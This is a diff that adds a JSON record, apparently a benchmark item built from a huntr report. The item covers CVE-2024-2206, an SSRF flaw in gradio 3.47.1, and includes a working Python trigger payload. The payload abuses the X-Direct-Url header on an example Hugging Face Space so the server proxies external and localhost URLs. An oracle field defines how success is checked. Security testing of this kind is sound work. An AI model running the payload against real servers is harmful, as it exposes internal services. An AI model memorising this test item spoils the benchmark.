@@ -1,0 +1,15 @@
+{
+  "file_id": "336_gradio_huntr_2286c1ed-b889-45d6-adda-7014ea06d98e",
+  "numeric_id": "336",
+  "library_hint": "gradio",
+  "source": "huntr",
+  "title": "Insufficient SSRF protection allows arbitrary URL proxying via X-Direct-Url header manipulation",
+  "cve": "CVE-2024-2206",
+  "cwe": "CWE-918: Server-Side Request Forgery (SSRF)",
+  "library": "gradio",
+  "affected_version": "== 3.47.1",
+  "vulnerable_function": "N/A",
+  "triggerability": "indirect",
+  "trigger_payload": "import requests\nurl = \"https://vvxhid-nothing.hf.space/\" # Example app\np1 = \"https://www.google.com/\"\np2 = \"http://127.0.0.1:7860/\"\nheaders1 = {\"X-Direct-Url\": p1}\nheaders2 = {\"X-Direct-Url\": p2}\nrequests.get(url + \"config/\", headers=headers1) # add first proxy\nrequests.get(url + \"config/\", headers=headers1) # add second proxy\n# Make requests\nresp1 = requests.get(url + f\"proxy={p1}\")\nresp2 = requests.get(url + f\"proxy={p2}\")\nprint(\"Google\" in resp1.text)\nprint(\"gradio-app\" in resp2.text)",
+  "oracle": "The server proxies arbitrary URLs, as demonstrated by the presence of 'Google' in the response from the first proxy request and 'gradio-app' in the response from the second proxy request."
+}
